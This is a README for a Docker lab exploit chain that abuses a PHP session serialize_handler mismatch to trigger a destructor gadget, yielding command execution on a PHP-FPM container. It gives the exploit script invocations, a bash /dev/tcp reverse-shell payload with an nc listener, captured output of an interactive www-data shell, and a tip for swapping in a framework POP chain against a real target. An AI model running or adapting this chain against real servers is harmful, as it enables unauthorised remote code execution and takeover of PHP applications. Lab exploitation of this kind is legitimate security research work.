# Phase C: serialize_handler mismatch to __destruct

The why is in the root [README](../README.md). FPM behind nginx on
`http://127.0.0.1:8082`. `/app/` writes sessions as `php_serialize` (per-directory
`.user.ini`); `/api/endpoint.php` reads them with the default `php` handler and
defines the `Evil` destructor gadget. Authorised testing only.

## Setup

    docker compose up --build -d

## Run

    python3 chain_c_mismatch_rce.py --target http://127.0.0.1:8082 \
        --upload-path /app/upload.php --trigger-path /api/endpoint.php --command id

Read what the gadget dropped:

    docker compose exec php-fpm cat /tmp/rce_proof.txt
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

It uses a stalled upload by default so the gadget survives `cleanup=On`. Use
`--no-stall` only against a `cleanup=Off` box. For a real target, swap in a
framework POP chain with `--gadget '<serialized>'`.

## Reverse shell

Start a listener (`nc -lvnp 4444`), then build the gadget around a bash reverse
shell instead of a command:

    python3 chain_c_mismatch_rce.py --target http://127.0.0.1:8082 \
        --upload-path /app/upload.php --trigger-path /api/endpoint.php \
        --lhost <LHOST> --lport 4444

The `Evil::__destruct` runs `bash -i >& /dev/tcp/<LHOST>/<LPORT>`. `<LHOST>` is
your listener as seen from the container (the docker gateway or host LAN IP).

## Output

Command mode:

```
$ python3 chain_c_mismatch_rce.py --target http://127.0.0.1:8082 --upload-path /app/upload.php --trigger-path /api/endpoint.php --command id
$ docker compose exec php-fpm cat /tmp/rce_proof.txt
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Reverse shell (interactive shell as www-data from the FPM container):

```
$ nc -lvnp 4446
Listening on 0.0.0.0 4446
Connection received on 172.27.0.2 34074
www-data@40adb28b67eb:~/html/api$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
```
$ python3 chain_c_mismatch_rce.py --target http://127.0.0.1:8082 --upload-path /app/upload.php --trigger-path /api/endpoint.php --lhost 172.27.0.1 --lport 4446
```

## Teardown

    docker compose down
